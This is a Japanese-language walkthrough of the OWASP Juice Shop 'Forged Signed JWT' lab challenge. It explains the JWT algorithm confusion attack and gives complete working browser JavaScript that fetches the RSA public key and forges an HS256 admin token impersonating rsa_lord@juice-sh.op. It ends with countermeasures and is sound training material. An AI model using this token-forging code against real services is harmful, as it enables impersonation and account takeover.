# Forged Signed JWT ✅

**難易度:** ⭐⭐⭐⭐⭐⭐
**カテゴリ:** Vulnerable Components
**目標:** RSA署名されたJWTを偽造してrsa_lord@juice-sh.opになりすます

## 思考プロセス

### 1. アルゴリズム混乱攻撃 (Algorithm Confusion Attack)

JWTがRS256（RSA署名）を使用している場合、アルゴリズムをHS256（HMAC署名）に変更し、RSA公開鍵をHMACの秘密鍵として使用する攻撃。

### 2. 公開鍵の取得

```
http://localhost:3000/encryptionkeys/jwt.pub
```

RSA公開鍵が公開されている。

### 3. 攻撃の原理

サーバーがJWTのalgヘッダーを信頼する場合:
1. RS256: 公開鍵で署名を検証
2. HS256: 秘密鍵で署名を検証 → **公開鍵を秘密鍵として使用**

公開鍵は公開されているので、攻撃者は同じ鍵でHMAC署名を生成できる。

## 実行手順

### 方法: browser_evaluate で HMAC 署名を生成

```javascript
async () => {
  // 公開鍵を取得
  const keyRes = await fetch('/encryptionkeys/jwt.pub');
  const publicKey = await keyRes.text();
  
  // JWTヘッダーとペイロード
  const header = { alg: 'HS256', typ: 'JWT' };
  const payload = {
    status: 'success',
    data: {
      id: 999,
      email: 'rsa_lord@juice-sh.op',
      role: 'admin'
    },
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + 3600
  };
  
  // Base64URL エンコード
  const base64url = (str) => btoa(str).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
  
  const headerB64 = base64url(JSON.stringify(header));
  const payloadB64 = base64url(JSON.stringify(payload));
  const signatureInput = headerB64 + '.' + payloadB64;
  
  // 公開鍵でHMAC-SHA256署名
  const encoder = new TextEncoder();
  const cryptoKey = await crypto.subtle.importKey(
    'raw',
    encoder.encode(publicKey),
    { name: 'HMAC', hash: 'SHA-256' },
    false,
    ['sign']
  );
  
  const signature = await crypto.subtle.sign(
    'HMAC',
    cryptoKey,
    encoder.encode(signatureInput)
  );
  
  const signatureB64 = base64url(String.fromCharCode(...new Uint8Array(signature)));
  const forgedToken = signatureInput + '.' + signatureB64;
  
  // 偽造トークンでリクエスト
  await fetch('/rest/user/whoami', {
    headers: { 'Authorization': 'Bearer ' + forgedToken }
  });
}
```

## コード/ペイロード

| 項目 | 値 |
|------|-----|
| 元のアルゴリズム | RS256 |
| 偽造アルゴリズム | HS256 |
| 公開鍵URL | `/encryptionkeys/jwt.pub` |
| 偽装ユーザー | `rsa_lord@juice-sh.op` |

## 解説

### アルゴリズム混乱攻撃の原理

```
正常なRS256検証:
  署名 = RSA_Sign(private_key, header.payload)
  検証 = RSA_Verify(public_key, signature) ✓

攻撃 (HS256に変更):
  偽署名 = HMAC(public_key, header.payload)
  サーバー: alg=HS256 → HMAC検証 → public_keyを使用
  検証 = HMAC_Verify(public_key, signature) ✓ ← 攻撃成功!
```

### なぜ成功するか

1. サーバーがJWTのalgヘッダーを信頼している
2. RS256とHS256で同じ鍵を使用
3. 公開鍵は公開されているので攻撃者も使用可能

### 対策

| 対策 | 説明 |
|------|------|
| **アルゴリズム固定** | サーバー側でアルゴリズムを固定し、ヘッダーを無視 |
| **鍵の分離** | RSAとHMACで異なる鍵を使用 |
| **alg検証** | 許可されたアルゴリズムのみ受け入れ |

## 参考リンク

- [Auth0 - Critical vulnerabilities in JWT libraries](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
